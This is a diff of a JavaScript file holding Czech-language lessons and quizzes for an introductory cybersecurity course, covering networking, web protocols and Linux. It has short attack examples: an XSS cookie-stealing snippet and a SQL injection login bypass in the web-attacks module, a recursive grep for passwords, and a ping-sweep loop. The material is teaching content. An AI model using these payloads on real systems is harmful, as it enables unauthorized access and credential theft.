@@ -330,341 +330,361 @@
         ];
 
         const courses = [
-            // --- PHASE 1 ---
+            // --- PHASE 1: MINDSET & TEORIE ---
             {
                 id: '1', title: "Offensive Security Intro", icon: "⚔️", tag: "Mindset",
-                desc: "Pochopte myšlení útočníka (Red Team).",
+                desc: "Pochopte myšlení útočníka (Red Team). Cyber Kill Chain a metodologie.",
                 content: `
                     <h2>Co je Offensive Security?</h2>
-                    <p>Offensive Security (útočná bezpečnost) je proaktivní přístup k zabezpečení systémů. Místo čekání na útok se snažíme systémy "nabourat" sami, abychom našli slabiny dříve než zločinci.</p>
+                    <p>Útočná bezpečnost netkví v bezhlavém bušení do klávesnice. Je to strukturovaný proces hledání chyb. Útočníci (Adversaries) mají výhodu: obránce musí uspět pokaždé, útočníkovi stačí jednou.</p>
                     
+                    <h3>Cyber Kill Chain</h3>
+                    <p>Standardní model útoku od Lockheed Martin:</p>
+                    <ol>
+                        <li><strong>Reconnaissance (Průzkum):</strong> Sbírání emailů, IP adres (OSINT).</li>
+                        <li><strong>Weaponization:</strong> Vytvoření viru/exploidu (např. infikované PDF).</li>
+                        <li><strong>Delivery:</strong> Odeslání oběti (Phishing).</li>
+                        <li><strong>Exploitation:</strong> Spuštění kódu na počítači oběti.</li>
+                        <li><strong>Installation:</strong> Zajištění trvalého přístupu (Persistence).</li>
+                        <li><strong>C2 (Command & Control):</strong> Komunikace s hackerech.</li>
+                        <li><strong>Actions on Objectives:</strong> Krádež dat, šifrování (Ransomware).</li>
+                    </ol>
+
                     <div style="background:rgba(255,255,255,0.05); padding:1rem; border-left:4px solid var(--accent); margin:1rem 0;">
-                        <strong>Hacker's Note:</strong> "Defenders have to be right 100% of the time. Attackers only have to be right once."
+                        <strong>Hacker's Note:</strong> Jako Pentester simulujeme tyto kroky, ale ve fázi "Actions" data nekrademe, jen prokážeme, že to jde.
                     </div>
-
-                    <h3>Klíčové Pojmy</h3>
-                    <ul>
-                        <li><strong>Vulnerability (Zranitelnost):</strong> Chyba v kódu nebo konfiguraci (např. neaktualizovaný Windows).</li>
-                        <li><strong>Exploit:</strong> Kód, který zneužije zranitelnost k získání kontroly.</li>
-                        <li><strong>Payload:</strong> To, co exploit doručí do systému (např. virus nebo backdoor).</li>
-                    </ul>
-
-                    <h3>Právní stránka věci</h3>
-                    <p>Rozdíl mezi kriminálníkem a expertem je <strong>POVOLENÍ</strong>. Nikdy neútočte na systémy, které nevlastníte nebo k tomu nemáte písemný souhlas.</p>
                 `,
-                quiz: { q: "Kód, který zneužívá zranitelnost, se nazývá:", options: ["Payload", "Exploit", "Patch"], correct: 1 }
+                quiz: { q: "Která fáze Kill Chainu zahrnuje sběr informací o cíli?", options: ["Exploitation", "Reconnaissance", "Installation"], correct: 1 }
             },
             {
                 id: '2', title: "Defensive Security Intro", icon: "🛡️", tag: "Mindset",
-                desc: "Blue Team operace a SOC centra.",
+                desc: "Blue Team operace: SOC, SIEM, EDR a Pyramid of Pain.",
                 content: `
-                    <h2>Obrana moderní infrastruktury</h2>
-                    <p>Zatímco útočníci hledají jednu díru, Blue Team musí hlídat "všechna okna a dveře".</p>
+                    <h2>Blue Team Operations</h2>
+                    <p>Obrana je těžší než útok. Musíte monitorovat tisíce zařízení.</p>
 
-                    <h3>SOC (Security Operations Center)</h3>
-                    <p>Velín, kde analytici sledují monitory 24/7. Používají nástroje jako <strong>SIEM</strong> (Security Information and Event Management), který sbírá logy z celé firmy.</p>
-                    <p><em>Příklad:</em> SIEM nahlásí: "Uživatel Novák se přihlásil z Prahy a o 5 sekund později z Číny." -> <strong>INCIDENT</strong>.</p>
+                    <h3>Nástroje Blue Teamu</h3>
+                    <ul>
+                        <li><strong>SIEM (Security Information & Event Management):</strong> "Mozek" SOCu. Nástroje jako Splunk nebo Wazuh sbírají logy.</li>
+                        <li><strong>EDR (Endpoint Detection & Response):</strong> Pokročilý "antivirus", který sleduje chování procesů (např. PowerShell spouští neznámý kód).</li>
+                        <li><strong>IDS/IPS:</strong> Senzory na síti, které hledají podezřelé pakety.</li>
+                    </ul>
 
-                    <h3>Threat Intelligence</h3>
-                    <p>Sbírání informací o hackerských skupinách. "Víme, že skupina APT28 používá tento typ malwaru, nastavíme podle toho firewall."</p>
+                    <h3>Pyramid of Pain</h3>
+                    <p>Koncept, který říká, jak těžké je pro útočníka změnit svou taktiku, když ho odhalíte:</p>
+                    <ul>
+                        <li>Hash souboru (Triviální změnit)</li>
+                        <li>IP adresa (Snadné)</li>
+                        <li>Doménové jméno (Jednoduché)</li>
+                        <li>TTPs (Taktiky, techniky - Velmi těžké změnit!)</li>
+                    </ul>
                 `,
-                quiz: { q: "Který systém slouží ke sběru a analýze logů v SOC?", options: ["SIEM", "DDOS", "HTML"], correct: 0 }
+                quiz: { q: "Co je na vrcholu 'Pyramid of Pain' (nejtěžší pro útočníka změnit)?", options: ["IP Adresy", "TTPs (Taktiky)", "Hash souborů"], correct: 1 }
             },
             {
                 id: '3', title: "Careers In Cyber", icon: "💼", tag: "Kariéra",
-                desc: "Pentester, Analyst, Engineer. Kdo co dělá?",
+                desc: "Pentester, Analyst, Engineer. Certifikace a cesty.",
                 content: `
-                    <h2>Mapa rolí v CyberSecurity</h2>
+                    <h2>Kariérní cesty</h2>
                     
-                    <h3>1. Technické útočné role (Red)</h3>
+                    <h3>Entry Level (Start)</h3>
                     <ul>
-                        <li><strong>Penetration Tester:</strong> Najatý hacker. Dostane cíl, sepíše report.</li>
-                        <li><strong>Exploit Developer:</strong> Programátor, který píše kód pro zneužití chyb (velmi pokročilé).</li>
+                        <li><strong>SOC Analyst L1:</strong> Prvotní třídění alertů. "Je toto falešný poplach?"</li>
+                        <li><strong>Junior Pentester:</strong> Automatizované skeny a jednoduché manuální testy.</li>
                     </ul>
 
-                    <h3>2. Technické obranné role (Blue)</h3>
+                    <h3>Certifikace, které mají váhu</h3>
                     <ul>
-                        <li><strong>Security Analyst (L1/L2/L3):</strong> První linie obrany v SOC.</li>
-                        <li><strong>Incident Responder:</strong> "Hasič". Vyjíždí k firmám, které byly právě hacknuty.</li>
-                        <li><strong>Malware Analyst:</strong> Pitvá viry v laboratoři (Reverse Engineering).</li>
+                        <li><strong>CompTIA Security+:</strong> Absolutní základ teorie.</li>
+                        <li><strong>OSCP (OffSec Certified Professional):</strong> Zlatý standard pro pentestery. 24h zkouška hackování.</li>
+                        <li><strong>CISSP:</strong> Manažerská certifikace pro seniory.</li>
                     </ul>
-
-                    <h3>3. Management</h3>
-                    <li><strong>CISO:</strong> Ředitel bezpečnosti. Odpovídá za rozpočet a strategii.</li>
-                `,
-                quiz: { q: "Kdo pitvá viry a zkoumá, jak fungují?", options: ["Penetration Tester", "Malware Analyst", "CISO"], correct: 1 }
-            },
-
-            // --- PHASE 2 ---
-            {
-                id: '4', title: "What is Networking?", icon: "🌐", tag: "Sítě",
-                desc: "Základy komunikace počítačů.",
-                content: `
-                    <h2>Sítě jsou základ hackingu</h2>
-                    <p>Nemůžete hacknout server, když nevíte, jak se k němu připojit. 99% útoků probíhá po síti.</p>
-                    
-                    <h3>Zařízení v síti</h3>
-                    <p>Každé zařízení má síťovou kartu (NIC). Aby spolu mohly mluvit, potřebují:</p>
-                    <ol>
-                        <li><strong>Fyzické médium:</strong> Kabel (Ethernet) nebo Vzduch (WiFi).</li>
-                        <li><strong>Protokol:</strong> Společný jazyk (např. TCP/IP).</li>
-                    </ol>
 
                     <div style="background:rgba(255,255,255,0.05); padding:1rem; border-left:4px solid var(--accent);">
-                        <strong>Hacker's Note:</strong> Útočníci často začínají tzv. "skenováním sítě", aby zjistili, jaká zařízení jsou online.
+                        <strong>Pro Tip:</strong> V IT neplatí "vystudoval jsem a končím". Musíte se učit každý týden. Technologie se mění extrémně rychle.
                     </div>
                 `,
-                quiz: { q: "Co je NIC?", options: ["Nový Internetový Kabel", "Network Interface Card (Síťová karta)", "Network Internal Code"], correct: 1 }
+                quiz: { q: "Která certifikace je považována za praktický standard pro pentestery?", options: ["CEH", "OSCP", "ITIL"], correct: 1 }
+            },
+
+            // --- PHASE 2: SÍTĚ ---
+            {
+                id: '4', title: "What is Networking?", icon: "🌐", tag: "Sítě",
+                desc: "WAN vs LAN, Bandwidth, Latency a Topologie.",
+                content: `
+                    <h2>Základy propojení</h2>
+                    <p>Internet je jen obří hromada kabelů (často podmořských), které spojují datacentra.</p>
+                    
+                    <h3>Typy sítí</h3>
+                    <ul>
+                        <li><strong>LAN (Local):</strong> Váš byt, jedna budova. Velmi rychlá (1-10 Gbps).</li>
+                        <li><strong>WAN (Wide):</strong> Internet. Spojuje LANy dohromady. Pomalejší, vyšší latence.</li>
+                        <li><strong>VPN (Virtual Private Network):</strong> Šifrovaný tunel přes veřejný internet do privátní sítě.</li>
+                    </ul>
+
+                    <h3>IP Adresy: v4 vs v6</h3>
+                    <p><strong>IPv4:</strong> <code>192.168.1.1</code> (Docházejí! Je jich jen cca 4 miliardy).</p>
+                    <p><strong>IPv6:</strong> <code>2001:0db8:85a3...</code> (Téměř nekonečno).</p>
+                `,
+                quiz: { q: "Jaký typ sítě spojuje zařízení na velké vzdálenosti (např. města)?", options: ["LAN", "PAN", "WAN"], correct: 2 }
             },
             {
                 id: '5', title: "Intro To LAN", icon: "🏠", tag: "Sítě",
-                desc: "Switch vs Router, Topologie sítí.",
+                desc: "MAC adresy, ARP protokol a Subnetting.",
                 content: `
-                    <h2>LAN (Local Area Network)</h2>
+                    <h2>Hlouběji do LAN</h2>
                     
-                    <h3>Switch (Přepínač) - Layer 2</h3>
-                    <p>Chytrá "prodlužka". Spojuje počítače v jedné místnosti. Zná jejich <strong>MAC adresy</strong>.</p>
-                    <p><em>Starý Hub:</em> Posílal data všem (hloupý). <em>Switch:</em> Posílá data jen adresátovi (chytrý & bezpečnější).</p>
+                    <h3>MAC Adresa (Media Access Control)</h3>
+                    <p>Fyzická adresa vypálená do čipu karty. Formát: <code>AA:BB:CC:11:22:33</code>. První polovina určuje výrobce (např. Apple, Dell).</p>
+                    
+                    <h3>ARP (Address Resolution Protocol)</h3>
+                    <p>Klíčový protokol. Počítač zná IP (192.168.1.5), ale potřebuje MAC, aby poslal data po kabelu.</p>
+                    <p>Zeptá se: <em>"Kdo má 192.168.1.5?"</em><br>Odpověď: <em>"Já, a moje MAC je AA:BB..."</em></p>
 
-                    <h3>Router (Směrovač) - Layer 3</h3>
-                    <p>Spojuje různé sítě (např. vaši domácí síť a Internet). Pracuje s <strong>IP adresami</strong>.</p>
-
-                    <p><strong>Většina útoků v LAN:</strong> ARP Spoofing (oblbnutí switche), Man-in-the-Middle.</p>
+                    <h3>Subnetting (Masky)</h3>
+                    <p>Maska <code>255.255.255.0</code> (/24) říká: "První 3 čísla jsou adresa ulice (sítě), poslední číslo je číslo domu (zařízení)."</p>
                 `,
-                quiz: { q: "Které zařízení spojuje LAN s Internetem?", options: ["Switch", "Hub", "Router"], correct: 2 }
+                quiz: { q: "Který protokol slouží k zjištění MAC adresy z IP adresy?", options: ["DNS", "DHCP", "ARP"], correct: 2 }
             },
             {
                 id: '6', title: "OSI Model", icon: "📚", tag: "Teorie",
-                desc: "7 vrstev, které musíš znát zpaměti.",
+                desc: "Detailní rozbor zapouzdření dat a útoků na vrstvy.",
                 content: `
-                    <h2>Open Systems Interconnection Model</h2>
-                    <p>Hacker musí vědět, na jaké vrstvě útok probíhá.</p>
+                    <h2>OSI Model - Proč ho řešíme?</h2>
+                    <p>Protože při řešení problémů (troubleshooting) postupujeme "Bottom-Up" (odspodu).</p>
 
-                    <table style="width:100%; border-collapse:collapse; margin-top:1rem;">
-                        <tr style="border-bottom:1px solid gray;"><th>Vrstva</th><th>Data</th><th>Příklad</th><th>Útok</th></tr>
-                        <tr><td>7. Aplikační</td><td>Data</td><td>HTTP, SSH</td><td>SQL Injection, Phishing</td></tr>
-                        <tr><td>6. Prezentační</td><td>Data</td><td>SSL/TLS</td><td>SSL Stripping</td></tr>
-                        <tr><td>5. Relační</td><td>Data</td><td>API</td><td>Session Hijacking</td></tr>
-                        <tr><td>4. Transportní</td><td>Segment</td><td>TCP, UDP</td><td>Port Scanning</td></tr>
-                        <tr><td>3. Síťová</td><td>Paket</td><td>IP, ICMP</td><td>Ping of Death</td></tr>
-                        <tr><td>2. Linková</td><td>Rámec</td><td>Ethernet, MAC</td><td>ARP Spoofing</td></tr>
-                        <tr><td>1. Fyzická</td><td>Bit</td><td>Kabel, WiFi</td><td>Vystřižení kabelu</td></tr>
-                    </table>
+                    <ol reversed>
+                        <li><strong>Aplikační:</strong> Prohlížeč, Data. <em>(Útok: Phishing, Malware/Makro)</em></li>
+                        <li><strong>Prezentační:</strong> Kódování (ASCII, JPEG), Šifrování. <em>(Útok: Malformed formats)</em></li>
+                        <li><strong>Relační:</strong> Udržení spojení.</li>
+                        <li><strong>Transportní:</strong> Porty (TCP/UDP). <em>(Útok: Port Scan, SYN Flood)</em></li>
+                        <li><strong>Síťová:</strong> IP Adresy, Routing. <em>(Útok: IP Spoofing)</em></li>
+                        <li><strong>Linková:</strong> MAC, VLANy. <em>(Útok: ARP Poisoning, VLAN Hopping)</em></li>
+                        <li><strong>Fyzická:</strong> Kabely, napětí. <em>(Útok: Vypojení kabelu, rušení)</em></li>
+                    </ol>
                 `,
-                quiz: { q: "Na jaké vrstvě OSI modelu funguje IP adresa?", options: ["2. Linková", "3. Síťová", "7. Aplikační"], correct: 1 }
+                quiz: { q: "Když vám nejde internet, protože je překousnutý kabel, je to chyba na vrstvě:", options: ["1. Fyzické", "3. Síťové", "7. Aplikační"], correct: 0 }
             },
             {
                 id: '7', title: "Packets & Frames", icon: "📦", tag: "Sítě",
-                desc: "Struktura dat. Headers, Payload, Trailers.",
+                desc: "TCP Handshake, UDP vs TCP, Wireshark analýza.",
                 content: `
-                    <h2>Anatomie Paketu</h2>
-                    <p>Představte si matrjošku. Data (např. "Ahoj") se balí do obálek.</p>
+                    <h2>TCP vs UDP</h2>
+                    
+                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:1rem;">
+                        <div style="border:1px solid #444; padding:0.5rem;">
+                            <strong>TCP (Transmission Control Protocol)</strong><br>
+                            Spolehlivý. Čeká na potvrzení. Pomalý.<br>
+                            <em>Použití: Web, Email, Soubory.</em>
+                        </div>
+                        <div style="border:1px solid #444; padding:0.5rem;">
+                            <strong>UDP (User Datagram Protocol)</strong><br>
+                            "Fire and forget". Bez potvrzení. Rychlý.<br>
+                            <em>Použití: Hry, Streamování, DNS.</em>
+                        </div>
+                    </div>
 
-                    <h3>1. IP Header (Hlavička)</h3>
-                    <p>Obsahuje: <strong>Source IP</strong> (Odkud), <strong>Destination IP</strong> (Kam), TTL (Time To Live).</p>
-
-                    <h3>2. TCP Header</h3>
-                    <p>Obsahuje: <strong>Source Port</strong> (např. 54321), <strong>Destination Port</strong> (např. 80 pro Web).</p>
-
-                    <h3>Handshake (Potřesení rukou)</h3>
-                    <p>TCP spojení začíná trojicí paketů: <strong>SYN</strong> -> <strong>SYN-ACK</strong> -> <strong>ACK</strong>. Hacker může poslat miliony SYN paketů a shodit server (SYN Flood DDoS).</p>
+                    <h3>3-Way Handshake (TCP)</h3>
+                    <p>Aby spojení vzniklo, musí se stát toto:</p>
+                    <ol>
+                        <li>Klient -> <strong>SYN</strong> (Chci volat) -> Server</li>
+                        <li>Server -> <strong>SYN-ACK</strong> (OK, poslouchám) -> Klient</li>
+                        <li>Klient -> <strong>ACK</strong> (Rozumím, začínáme) -> Server</li>
+                    </ol>
+                    <p>Hackeři používají nástroj <strong>Wireshark</strong> k odchytávání těchto paketů.</p>
                 `,
-                quiz: { q: "Jak se nazývá útok zahlcením SYN pakety?", options: ["SYN Flood", "ACK Storm", "Ping Scan"], correct: 0 }
+                quiz: { q: "Který protokol je rychlejší, ale nespolehlivý (nehodí se pro stahování souborů)?", options: ["TCP", "UDP", "HTTP"], correct: 1 }
             },
             {
                 id: '8', title: "Extending Your Network", icon: "🌍", tag: "Sítě",
-                desc: "Port Forwarding, Firewall a DHCP.",
+                desc: "Port Forwarding, Firewall rules a DMZ.",
                 content: `
-                    <h2>Jak to funguje "venku"?</h2>
+                    <h2>Bezpečnostní architektura</h2>
                     
-                    <h3>DHCP (Dynamic Host Configuration Protocol)</h3>
-                    <p>Když přijdete do kavárny, ne nastavujete si IP ručně. DHCP server vám ji "pronajme" automaticky.</p>
-
-                    <h3>Port Forwarding</h3>
-                    <p>Pokud chcete, aby se někdo z internetu dostal na váš Minecraft server doma, musíte na routeru říct: "Všechno, co přijde na port 25565, pošli na můj počítač."</p>
-
                     <h3>Firewall</h3>
-                    <p>Vrátný. Pravidla typu: "Zablokuj vše z Číny" nebo "Povol jen port 80."</p>
+                    <p>Může být softwarový (Windows Defender) nebo hardwarový (krabice v serverovně).</p>
+                    <p><strong>Stateful Firewall:</strong> Pamatuje si spojení. Když vyvoláte spojení vy (zevnitř), odpověď pustí zpět automaticky.</p>
+
+                    <h3>DMZ (Demilitarized Zone)</h3>
+                    <p>Speciální část sítě pro servery, které musí být přístupné z internetu (Webserver). Pokud hacker hackne Webserver v DMZ, neměl by se dostat do vnitřní sítě s daty o zaměstnancích.</p>
                 `,
-                quiz: { q: "Která služba automaticky přiděluje IP adresy zařízením?", options: ["DNS", "DHCP", "FTP"], correct: 1 }
+                quiz: { q: "Kam umístíte veřejný webový server, abyste ochránili vnitřní síť?", options: ["Do domácí skupiny", "Do DMZ", "Přímo do internetu bez firewallu"], correct: 1 }
             },
 
-            // --- PHASE 3 ---
+            // --- PHASE 3: WEB ---
             {
                 id: '9', title: "DNS in Detail", icon: "📒", tag: "Web",
-                desc: "Records A, AAAA, MX, CNAME. DNS Poisoning.",
+                desc: "Records A, AAAA, MX, CNAME. DNS Poisoning, HOSTS file.",
                 content: `
-                    <h2>DNS: Internetový telefonní seznam</h2>
-                    
-                    <h3>Typy záznamů:</h3>
-                    <ul>
-                        <li><strong>A:</strong> Doména -> IPv4 (google.com -> 142.250.x.x)</li>
-                        <li><strong>AAAA:</strong> Doména -> IPv6</li>
-                        <li><strong>MX (Mail Exchange):</strong> Kam posílat emaily.</li>
-                        <li><strong>TXT:</strong> Textové info (používá se pro ověření vlastnictví domény).</li>
-                    </ul>
+                    <h2>DNS pod kapotou</h2>
+                    <p>Než se počítač zeptá DNS serveru, podívá se do souboru <strong>HOSTS</strong>.</p>
+                    <p><em>Windows:</em> <code>C:\\Windows\\System32\\drivers\\etc\\hosts</code><br>
+                    <em>Linux:</em> <code>/etc/hosts</code></p>
+                    <p>Malware často připíše do hosts: <code>127.0.0.1 facebook.com</code>, čímž vám zablokuje přístup.</p>
 
-                    <div style="background:rgba(255,255,255,0.05); padding:1rem; border-left:4px solid var(--accent);">
-                        <strong>Hacker's Note:</strong> Subdomain Enumeration je proces hledání tajných subdomén (např. <code>dev.firma.cz</code>, <code>admin.firma.cz</code>) pomocí slovníkových útoků na DNS.
-                    </div>
+                    <h3>DNS Hierarchy</h3>
+                    <p><strong>. (Root)</strong> -> <strong>.cz (TLD)</strong> -> <strong>seznam.cz (Domain)</strong>.</p>
                 `,
-                quiz: { q: "Který DNS záznam slouží pro emaily?", options: ["A", "MX", "CNAME"], correct: 1 }
+                quiz: { q: "Který lokální soubor má přednost před DNS serverem?", options: ["config.sys", "hosts", "index.html"], correct: 1 }
             },
             {
                 id: '10', title: "HTTP in Detail", icon: "📄", tag: "Web",
-                desc: "Headers, Cookies, Status Codes, HTTPS.",
+                desc: "Methods, Headers, Status Codes, HTTPS a Certifikáty.",
                 content: `
-                    <h2>HyperText Transfer Protocol</h2>
-                    <p>Jazyk webu. Vše je text.</p>
-
-                    <h3>Request (Požadavek)</h3>
-                    <code>GET /index.html HTTP/1.1
-Host: hackshield.cz
-User-Agent: Mozilla/5.0...
-Cookie: session_id=xyz123</code>
-
-                    <h3>Response (Odpověď)</h3>
-                    <code>HTTP/1.1 200 OK
-Server: nginx
-Content-Type: text/html
-
-&lt;html&gt;...</code>
-
-                    <h3>Cookies</h3>
-                    <p>Malé textové soubory pro zapamatování přihlášení. Pokud hacker ukradne vaši <strong>Session Cookie</strong>, je přihlášen jako vy (Session Hijacking).</p>
-                `,
-                quiz: { q: "Co se stane, když útočník získá vaši platnou Session Cookie?", options: ["Nic, je šifrovaná", "Může se vydávat za vás bez hesla", "Systém ho odhlásí"], correct: 1 }
-            },
-            {
-                id: '11', title: "How Websites Work", icon: "🏗️", tag: "Web",
-                desc: "Client-Server model. Jazyky webu.",
-                content: `
-                    <h2>Frontend vs Backend</h2>
+                    <h2>Jak mluví prohlížeč</h2>
                     
-                    <h3>Frontend (Klient)</h3>
-                    <p>Běží u VÁS v prohlížeči. HTML, CSS, JavaScript. Hacker zde může manipulovat kód (XSS útoky), ale neohrozí tím přímo server.</p>
+                    <h3>Metody:</h3>
+                    <ul>
+                        <li><code>GET</code>: Dej mi data. Data jsou v URL (<code>?id=1</code>).</li>
+                        <li><code>POST</code>: Posílám data (hesla). Data jsou v těle (body).</li>
+                        <li><code>PUT</code>: Nahraj/Uprav soubor.</li>
+                        <li><code>DELETE</code>: Smaž to.</li>
+                    </ul>
 
-                    <h3>Backend (Server)</h3>
-                    <p>Běží na serveru. Python, PHP, Node.js, Java. Komunikuje s databází. Zde se dějí kritické chyby jako <strong>SQL Injection</strong> nebo <strong>RCE (Remote Code Execution)</strong>.</p>
+                    <h3>HTTPS (TLS)</h3>
+                    <p>Šifrovaná verze. Používá certifikáty. Pokud vidíte zámek 🔒, komunikaci nikdo po cestě nemůže číst (ani poskytovatel internetu, ani hacker na WiFi).</p>
                 `,
-                quiz: { q: "Kde běží JavaScript kód při XSS útoku?", options: ["Na serveru", "V prohlížeči oběti", "V databázi"], correct: 1 }
+                quiz: { q: "Která HTTP metoda se nejčastěji používá pro odeslání přihlašovacího formuláře?", options: ["GET", "POST", "HEAD"], correct: 1 }
             },
             {
-                id: '12', title: "Putting it all together", icon: "🧩", tag: "Shrnutí",
-                desc: "Komplexní pohled na Load Balancery, CDN a WAF.",
+                id: '11', title: "Basic Web Attacks", icon: "🏗️", tag: "Web",
+                desc: "OWASP Top 10: XSS, SQL Injection a principy.",
                 content: `
-                    <h2>Moderní architektura</h2>
-                    <p>Když jdete na Facebook, nepřipojujete se na jeden server pod stolem Marka Zuckerberga.</p>
+                    <h2>Útoky na web</h2>
+                    
+                    <h3>XSS (Cross-Site Scripting)</h3>
+                    <p>Útočník vloží JavaScript do stránky, kterou si prohlíží někdo jiný.</p>
+                    <code>&lt;script&gt;stealCookies()&lt;/script&gt;</code>
+                    <p>Pokud web tento text nevyčistí, kód se spustí v prohlížeči oběti.</p>
+
+                    <h3>SQL Injection (SQLi)</h3>
+                    <p>Útok na databázi. Představte si přihlášení:</p>
+                    <code>SELECT * FROM users WHERE name = '$USER';</code>
+                    <p>Když jako jméno zadám: <code>admin' OR 1=1 --</code></p>
+                    <p>Dotaz se změní na: <code>...WHERE name = 'admin' OR 1=1</code>. Jelikož 1=1 je vždy pravda, pustí mě to dovnitř.</p>
+                `,
+                quiz: { q: "Který útok cílí na databázi aplikace?", options: ["XSS", "SQL Injection", "Brute Force"], correct: 1 }
+            },
+            {
+                id: '12', title: "Developer Tools", icon: "🧩", tag: "Web",
+                desc: "Inspect Element, Console, Network Tab.",
+                content: `
+                    <h2>F12 - Hacker's Best Friend</h2>
+                    <p>Každý prohlížeč má vestavěné nástroje pro vývojáře.</p>
 
                     <ul>
-                        <li><strong>Load Balancer:</strong> Rozděluje zátěž mezi tisíce serverů.</li>
-                        <li><strong>CDN (Content Delivery Network):</strong> Servery po celém světě, které ukládají obrázky a videa blízko k vám (zrychlení).</li>
-                        <li><strong>WAF (Web Application Firewall):</strong> Speciální firewall, který čte HTTP provoz a blokuje útoky jako SQL Injection.</li>
+                        <li><strong>Inspector:</strong> Umožňuje měnit HTML stránky (jen u vás). Můžete povolit zakázaná tlačítka, odkrýt hesla typu "password" na "text".</li>
+                        <li><strong>Console:</strong> Spouštění JavaScriptu.</li>
+                        <li><strong>Network:</strong> Vidíte všechny requesty. Co se posílá, když kliknete na "Login"? Zde to najdete.</li>
                     </ul>
+
+                    <div style="background:rgba(255,255,255,0.05); padding:1rem; border-left:4px solid var(--accent);">
+                        <strong>Úkol:</strong> Otevřete F12, jděte na kartu Network a obnovte tuto stránku. Podívejte se, kolik souborů se stáhlo.
+                    </div>
                 `,
-                quiz: { q: "Co dělá WAF?", options: ["Zrychluje nahrávání obrázků", "Blokuje webové útoky", "Rozděluje zátěž serverů"], correct: 1 }
+                quiz: { q: "Která karta v Developer Tools ukazuje HTTP komunikaci?", options: ["Console", "Inspector", "Network"], correct: 2 }
             },
 
-            // --- PHASE 4 ---
+            // --- PHASE 4: LINUX ---
             {
                 id: '13', title: "Linux Fundamentals pt1", icon: "🐧", tag: "Linux",
-                desc: "Shell, Proměnné, Aliasy, Man pages.",
+                desc: "Shell, Vyhledávání (find, locate), Grep v praxi.",
                 content: `
-                    <h2>Síla Terminálu</h2>
-                    <p>GUI (grafické rozhraní) je pomalé a neumí vše. CLI (Command Line) je supermoc.</p>
-
-                    <h3>Základní navigace</h3>
-                    <code>ls -la   # Vypiš VŠECHNY soubory (i skryté) s detaily
-cd /var/log # Jdi do složky logů
-cd ..      # O úroveň výš
-cd ~       # Domů (Home Directory)</code>
-
-                    <h3>Roury (Pipes)</h3>
-                    <p>Symbol <code>|</code> vezme výstup jednoho příkazu a pošle ho do dalšího.</p>
-                    <p><code>cat soubor.txt | grep "heslo"</code> -> Vypíše obsah a hned v něm hledá slovo "heslo".</p>
-                `,
-                quiz: { q: "Co dělá příkaz 'grep'?", options: ["Maže soubory", "Hledá text v datech", "Restartuje počítač"], correct: 1 }
-            },
-            {
-                id: '14', title: "Linux Fundamentals pt2", icon: "🐧", tag: "Linux",
-                desc: "SSH, Process Management, VIM/Nano.",
-                content: `
-                    <h2>Vzdálená správa</h2>
-                    <h3>SSH (Secure Shell)</h3>
-                    <p>Standard pro správu serverů. <code>ssh uzivatel@ip-adresa</code>. Veškerá komunikace je šifrovaná.</p>
-
-                    <h3>Procesy</h3>
-                    <p><code>top</code> nebo <code>htop</code>: Správce úloh v terminálu.</p>
-                    <p><code>ps aux</code>: Výpis všech procesů.</p>
-                    <p><code>kill [PID]</code>: Ukončení procesu podle ID.</p>
-
-                    <h3>Editory</h3>
-                    <p>Na serveru není Notepad. Používáme <strong>Nano</strong> (pro začátečníky) nebo <strong>Vim</strong> (pro profíky).</p>
-                `,
-                quiz: { q: "Který port standardně používá SSH?", options: ["80", "22", "443"], correct: 1 }
-            },
-            {
-                id: '15', title: "Linux Fundamentals pt3", icon: "🐧", tag: "Linux",
-                desc: "Permissions, Scripting (Bash), Cron.",
-                content: `
-                    <h2>Automatizace a Práva</h2>
+                    <h2>Linux Power User</h2>
                     
-                    <h3>Bash Scripting</h3>
-                    <p>Můžete napsat soubor příkazů, který se spustí najednou. Např. automatický sken sítě každé ráno.</p>
+                    <h3>Vyhledávání souborů</h3>
+                    <ul>
+                        <li><code>find / -name "flag.txt"</code>: Prohledá celý disk.</li>
+                        <li><code>locate flag.txt</code>: Rychlejší, hledá v indexu.</li>
+                    </ul>
 
-                    <h3>Cron Jobs</h3>
-                    <p>Plánovač úloh. "Spusť tento skript každé pondělí v 8:00."</p>
-                    <p>Hackeři často používají Cron pro <strong>Persistence</strong> (aby virus přežil restart PC).</p>
-
-                    <h3>Sudoers</h3>
-                    <p>Soubor <code>/etc/sudoers</code> určuje, kdo může být admin. Pokud ho hacker upraví, vyhrál.</p>
+                    <h3>Grep (Global Regular Expression Print)</h3>
+                    <p>Absolutně nejdůležitější nástroj.</p>
+                    <ul>
+                        <li><code>grep "error" server.log</code>: Vypíše řádky obsahující "error".</li>
+                        <li><code>grep -r "password" /home/</code>: Rekurzivně hledá slovo ve všech souborech.</li>
+                    </ul>
                 `,
-                quiz: { q: "K čemu slouží Cron?", options: ["K prohlížení webu", "K plánování opakovaných úloh", "K instalaci programů"], correct: 1 }
+                quiz: { q: "Jaký příkaz použijete k hledání konkrétního textu uvnitř souborů?", options: ["find", "grep", "ls"], correct: 1 }
+            },
+            {
+                id: '14', title: "Linux Permissions", icon: "🐧", tag: "Linux",
+                desc: "Chmod, Chown, Sudoers, RWX kalkulace.",
+                content: `
+                    <h2>Matematika oprávnění</h2>
+                    <p>Práva jsou čísla: R=4, W=2, X=1.</p>
+                    
+                    <ul>
+                        <li><strong>7 (4+2+1):</strong> Čtení, Zápis, Spuštění.</li>
+                        <li><strong>5 (4+1):</strong> Čtení, Spuštění.</li>
+                        <li><strong>0:</strong> Nic.</li>
+                    </ul>
+
+                    <p>Příkaz <code>chmod 777 soubor</code> dá plná práva VŠEM (Vlastník, Skupina, Ostatní). <strong>Bezpečnostní riziko!</strong></p>
+                    <p>Bezpečnější je často <code>chmod 755</code> (Vlastník vše, ostatní jen číst/spustit) nebo <code>600</code> (Jen vlastník číst/zápis).</p>
+                `,
+                quiz: { q: "Co znamená oprávnění 7 v Linuxu?", options: ["Jen čtení (Read)", "Jen zápis (Write)", "Vše (Read+Write+Execute)"], correct: 2 }
+            },
+            {
+                id: '15', title: "Bash Scripting", icon: "🐧", tag: "Linux",
+                desc: "Variables, Loops, If statements. Automatizace úloh.",
+                content: `
+                    <h2>Automatizace v Bash</h2>
+                    <p>Skripty začínají "shebangem": <code>#!/bin/bash</code>.</p>
+
+                    <h3>Příklad Ping Sweepru</h3>
+                    <code>for i in {1..254}; do
+  ping -c 1 192.168.1.$i | grep "64 bytes" &
+done</code>
+                    <p>Tento jednoduchý loop "pingne" všechny adresy v síti a ukáže ty živé. Hacker to napíše za 10 sekund.</p>
+                `,
